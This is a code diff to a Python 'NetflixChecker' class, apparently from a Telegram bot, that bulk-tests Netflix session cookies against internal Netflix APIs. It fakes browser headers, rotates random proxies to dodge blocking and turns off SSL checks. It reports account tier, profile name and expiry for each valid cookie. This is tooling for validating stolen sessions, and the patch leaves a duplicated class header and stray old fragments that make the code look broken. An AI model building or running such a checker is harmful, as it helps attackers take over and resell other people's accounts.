@@ -889,6 +889,140 @@ class NetflixChecker:
                                 timeout=timeout,
                                 proxy=proxy,
                                 ssl=False
+# ----------------------------- NETFLIX CHECKER ENGINE (FIXED) ------------------
+class NetflixChecker:
+    @staticmethod
+    async def check_single_cookie(cookie: str) -> Dict:
+        """Check a single Netflix cookie with proxy fallback and improved headers"""
+        result = {
+            "valid": False,
+            "account_tier": None,
+            "profile_name": None,
+            "profile_language": None,
+            "maturity_level": None,
+            "expires_at": None,
+            "error": None
+        }
+
+        # Parse cookie
+        cookie_dict = parse_cookie(cookie)
+        if not cookie_dict:
+            result["error"] = "Invalid cookie format (no key=value pairs)"
+            return result
+
+        # Build cookie string
+        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
+
+        # Headers – Netflix ko real browser jaisa dikhe
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Cookie": cookie_str,
+            "Host": "www.netflix.com",
+            "Origin": "https://www.netflix.com",
+            "Referer": "https://www.netflix.com/",
+            "Connection": "keep-alive",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "Upgrade-Insecure-Requests": "1",
+            "DNT": "1",
+            "TE": "trailers",
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache"
+        }
+
+        # Proxies – try multiple, fallback to direct if all fail
+        proxies_to_try = []
+        if USE_PROXY and _all_proxies:
+            # Shuffle and take first 5 unique proxies
+            shuffled = _all_proxies.copy()
+            random.shuffle(shuffled)
+            proxies_to_try = shuffled[:5]  # Try 5 random proxies
+        proxies_to_try.append(None)  # Finally try direct connection
+
+        last_error = None
+
+        for proxy in proxies_to_try:
+            try:
+                logger.info(f"Trying proxy: {proxy if proxy else 'DIRECT'}")
+                async with aiohttp.ClientSession() as session:
+                    profile_url = "https://www.netflix.com/api/shakti/viper/metadata"
+                    params = {
+                        "movieid": "80057281",
+                        "image_sizes": "185x278,464x696,50x70,278x185,696x278,70x50,96x96",
+                        "image_format": "webp",
+                        "with_size": "true",
+                        "materialize": "true",
+                        "uncached": "false"
+                    }
+
+                    timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
+
+                    async with session.get(
+                        profile_url,
+                        headers=headers,
+                        params=params,
+                        timeout=timeout,
+                        proxy=proxy,
+                        ssl=False
+                    ) as resp:
+                        logger.info(f"Status: {resp.status} (proxy: {proxy if proxy else 'DIRECT'})")
+
+                        if resp.status == 200:
+                            data = await resp.json()
+                            if data and "video" in data:
+                                result["valid"] = True
+                                result["account_tier"] = NetflixChecker._detect_tier(data)
+                                result["profile_name"] = NetflixChecker._get_profile_name(data)
+                                result["profile_language"] = NetflixChecker._get_language(data)
+                                result["maturity_level"] = NetflixChecker._get_maturity(data)
+
+                                # Get account details (expiry)
+                                try:
+                                    account_url = "https://www.netflix.com/api/shakti/viper/user"
+                                    async with session.get(
+                                        account_url,
+                                        headers=headers,
+                                        timeout=timeout,
+                                        proxy=proxy,
+                                        ssl=False
+                                    ) as acc_resp:
+                                        if acc_resp.status == 200:
+                                            acc_data = await acc_resp.json()
+                                            if acc_data and "account" in acc_data:
+                                                account = acc_data.get("account", {})
+                                                if "expires" in account:
+                                                    result["expires_at"] = account.get("expires")
+                                except Exception as e:
+                                    logger.debug(f"Account details error: {e}")
+
+                                # Success – return immediately
+                                return result
+                            else:
+                                result["error"] = "No video data in response"
+                                return result
+
+                        elif resp.status == 401 or resp.status == 403:
+                            result["error"] = "Invalid cookie (unauthorized)"
+                            return result
+                        elif resp.status == 404:
+                            result["error"] = "Account not found"
+                            return result
+                        elif resp.status == 421:
+                            # Try different Host header
+                            headers["Host"] = "api.netflix.com"
+                            headers["Origin"] = "https://api.netflix.com"
+                            async with session.get(
+                                profile_url,
+                                headers=headers,
+                                params=params,
+                                timeout=timeout,
+                                proxy=proxy,
+                                ssl=False
                             ) as retry_resp:
                                 if retry_resp.status == 200:
                                     data = await retry_resp.json()
@@ -896,25 +1030,32 @@ class NetflixChecker:
                                         result["valid"] = True
                                         result["account_tier"] = "Unknown"
                                         result["profile_name"] = "Unknown"
-                                    else:
-                                        result["error"] = "Cookie invalid (421)"
+                                        return result
                                 else:
-                                    result["error"] = f"HTTP 421 - Cookie invalid or expired"
+                                    result["error"] = f"HTTP 421 (retry failed) – cookie may be expired"
+                                    return result
                         else:
-                            result["error"] = f"HTTP {resp.status}"
-                            
-                except asyncio.TimeoutError:
-                    result["error"] = "Timeout"
-                except aiohttp.ClientProxyConnectionError:
-                    result["error"] = "Proxy connection failed"
-                except Exception as e:
-                    result["error"] = str(e)
-        
-        except Exception as e:
-            result["error"] = str(e)
-        
+                            # Any other status – log but continue to next proxy
+                            last_error = f"HTTP {resp.status}"
+                            continue
+
+            except asyncio.TimeoutError:
+                last_error = "Timeout"
+                continue
+            except aiohttp.ClientProxyConnectionError:
+                last_error = "Proxy connection failed"
+                continue
+            except aiohttp.ClientError as e:
+                last_error = f"Client error: {str(e)}"
+                continue
+            except Exception as e:
+                last_error = str(e)
+                continue
+
+        # If we reach here, all proxies failed
+        result["error"] = f"All attempts failed. Last error: {last_error}"
         return result
-    
+
     @staticmethod
     def _detect_tier(data: Dict) -> str:
         if "video" in data:
@@ -927,7 +1068,6 @@ class NetflixChecker:
                     return "Standard"
                 elif "basic" in tier.lower():
                     return "Basic"
-        
         if "availableMaturityLevels" in data:
             levels = data.get("availableMaturityLevels", [])
             if len(levels) >= 4:
@@ -936,9 +1076,8 @@ class NetflixChecker:
                 return "Standard"
             elif len(levels) >= 2:
                 return "Basic"
-        
         return "Unknown"
-    
+
     @staticmethod
     def _get_profile_name(data: Dict) -> str:
         if "profiles" in data:
@@ -946,24 +1085,24 @@ class NetflixChecker:
             if profiles and "name" in profiles[0]:
                 return profiles[0].get("name")
         return "Unknown"
-    
+
     @staticmethod
     def _get_language(data: Dict) -> str:
         if "preferredLanguage" in data:
             return data.get("preferredLanguage")
         return "Unknown"
-    
+
     @staticmethod
     def _get_maturity(data: Dict) -> str:
         if "maturityLevel" in data:
             return data.get("maturityLevel")
         return "Unknown"
-    
+
     @staticmethod
     async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
         results = []
         semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
-        
+
         async def check_one(cookie: str, index: int):
             async with semaphore:
                 result = await NetflixChecker.check_single_cookie(cookie)
@@ -972,10 +1111,10 @@ class NetflixChecker:
                 if progress_callback:
                     await progress_callback(index, len(cookies))
                 return result
-        
+
         tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         processed = []
         for result in results:
             if isinstance(result, Exception):
@@ -986,7 +1125,7 @@ class NetflixChecker:
                 })
             else:
                 processed.append(result)
-        
+
         return processed
      # ----------------------------- TELEGRAM HANDLERS -----------------------
 def admin_required(func):
